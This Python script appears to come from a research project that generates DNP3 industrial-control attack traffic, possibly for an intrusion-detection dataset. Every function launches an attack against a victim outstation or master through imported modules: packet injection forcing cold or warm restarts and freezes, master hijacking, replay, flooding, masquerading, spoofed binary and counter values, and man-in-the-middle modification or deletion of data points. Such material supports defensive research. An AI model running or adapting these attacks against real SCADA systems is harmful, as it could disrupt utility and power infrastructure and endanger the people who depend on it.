__author__ = 'Nicholas Rodofile'

from DNP3_MITM_Injection import *
from DNP3_MITM_Modification import *
from master_thief_replay_flooder import *
from DNP3_Recon import *
from DNP3_Injection_replay_updater import *
from DNP3_Injection_replay_updater_ack import *
from DNP3_Slave_object_spoof import *
from DNP3_Slave_Flooder import *
from attack_timer import *
from DNP3_Master_Flooding import *
from random import randint, shuffle
from sniffing import *
from DNP3_Master_Masq import *
from DNP3_Slave_Replay import *
from UDP_Server import *

replay_file = 'mitm/replay_20160225_1634.pcap'
mst_replay_file = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'
mst_replay_file2 = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'
slave_replay_file = 'mitm/replay_20160225_1634.pcap'
verbose = 0
pkt_count = 100
local = "dataset/"
interface = 'eth0'
minute = 60
hour = (60 * minute)
service_time = 1.0 * minute



def injection_replay(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionReplay(replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count, timeout=4)
    injector.inject_packet()


def injection_replay_updater(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionReplayUpdater(replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def injection_replay_updaterAck(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionReplayUpdaterAck(replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def injection_FreezeObj(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionFreezeObj()
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def injection_ColdRestart(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionColdRestart()
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def injection_WarmRestart(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionWarmRestart()
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def injection_push(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionPush()
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def master_hijacking_replay(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = MasterThiefReplay(victim, mst_replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def master_hijacking_replay_flooding(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector2 = MasterThiefReplayFlooder(victim, mst_replay_file2)
    sniff(iface='eth1', filter=filter, prn=injector2.process_pkt, count=pkt_count)


def master_hijacking_masquerading(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = MasterThiefMasqu(victim)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=pkt_count)


def slave_masquerading(victim, gateway):
    os.system("./networkrestart.sh")
    slave = Slave(victim, dnp3_port, service_time)
    DNP = slave.start()
    os.system("./networkrestart_attacker.sh")
    del slave

def master_masquerading(victim, gateway):
    master = DNP3_Master_Masquerading(victim, dnp3_port, service_time)
    master.start()
    del master


def master_flooding(victim, gateway):
    flooder = DNP3_Master_flooding(victim, dnp3_port, service_time)
    flooder.start()
    del flooder

def master_flooding_freeze(victim, gateway):
    flooder = DNP3_Master_flooding_Freeze(victim, dnp3_port, service_time)
    flooder.start()
    del flooder

def master_flooding_time(victim, gateway):
    flooder = DNP3_Master_flooding_time(victim, dnp3_port, service_time)
    flooder.start()
    del flooder


def master_replay(victim, gateway):
    replayer = DNP3_Replay(victim, dnp3_port, mst_replay_file)
    replayer.start()
    del replayer

def master_replay_flooding(victim, gateway):
    replayer = DNP3_Replay_Flooder(victim, dnp3_port, mst_replay_file)
    replayer.start()
    del replayer

def slave_replay(victim, gateway):
    os.system("./networkrestart.sh")
    slave = DNP3_Slave_Replay(victim, dnp3_port, slave_replay_file, service_time)
    DNP = slave.start()
    os.system("./networkrestart_attacker.sh")
    del slave

def slave_masquerading_flooding(victim, gateway):
    os.system("./networkrestart.sh")
    slave = DNP3_Slave_Flooder(victim, dnp3_port, service_time)
    DNP = slave.start()
    os.system("./networkrestart_attacker.sh")
    del slave

def slave_masquerading_ObjectSpoofBinary(victim, gateway):
    os.system("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_BinaryStatus(victim, dnp3_port, service_time)
    DNP = slave.start()
    os.system("./networkrestart_attacker.sh")
    del slave

def slave_masquerading_ObjectSpoofCounter(victim, gateway):
    os.system("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_CounterStatus(victim, dnp3_port, service_time)
    DNP = slave.start()
    os.system("./networkrestart_attacker.sh")
    del slave

def slave_masquerading_ObjectSpoofBinaryFuzz(victim, gateway):
    os.system("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_BinaryStatus_fuzz(victim, dnp3_port, service_time)
    DNP = slave.start()
    os.system("./networkrestart_attacker.sh")
    del slave

def slave_masquerading_ObjectSpoofCounterFuzz(victim, gateway):
    os.system("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_CounterStatus_fuzz(victim, dnp3_port, service_time)
    DNP = slave.start()
    os.system("./networkrestart_attacker.sh")
    del slave

def MITM_forwarding(victim, gateway):
    mitm = DNP3_MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)
    DNP = mitm.start()

def MITM_hijack_injection(victim, gateway):
    mitm = DNP3_MITM_Injection(interface_selected=interface, gateway=gateway, victim=victim,
                               verbose=verbose, pkt_count=pkt_count)
    DNP = mitm.start()

def MITM_modification(victim, gateway, MITM_function="forwarding", pkt_count=50):
    mitm = DNP3_MITM_Modification(interface_selected=interface, gateway=gateway, victim=victim,
                                  verbose=verbose, pkt_count=pkt_count, MITM_function=MITM_function)
    DNP = mitm.start()

def MITM_modification_lengthOverflow(victim, gateway):
    MITM_modification(victim, gateway, "length_over_flow")

def MITM_modification_ImmedFreezeNR(victim, gateway):
    MITM_modification(victim, gateway, "IMMED_FREEZE_NR_modification")

def MITM_modification_BinaryStatus(victim, gateway):
    MITM_modification(victim, gateway, "BinaryStatus_modification")

def MITM_modification_CounterStatus(victim, gateway):
    MITM_modification(victim, gateway, "CounterStatus_modification")

def MITM_modification_BinaryInputPointDelete(victim, gateway):
    MITM_modification(victim, gateway, "BinaryInputPointDelete")

def MITM_modification_BinaryInputDataDelete(victim, gateway):
    MITM_modification(victim, gateway, "BinaryInputDataDelete")

def MITM_modification_BinaryInputPointInsert(victim, gateway):
    MITM_modification(victim, gateway, "BinaryInputPointInsert")

# def MITM_modification_CountBinaryInputDataDelete(victim, gateway):
#     MITM_modification(victim, gateway, "CountBinaryInputDataDelete", pkt_count=80)

def MITM_modification_CountBinaryInputPointInsert(victim, gateway):
    MITM_modification(victim, gateway, "CountBinaryInputPointInsert", pkt_count=80)











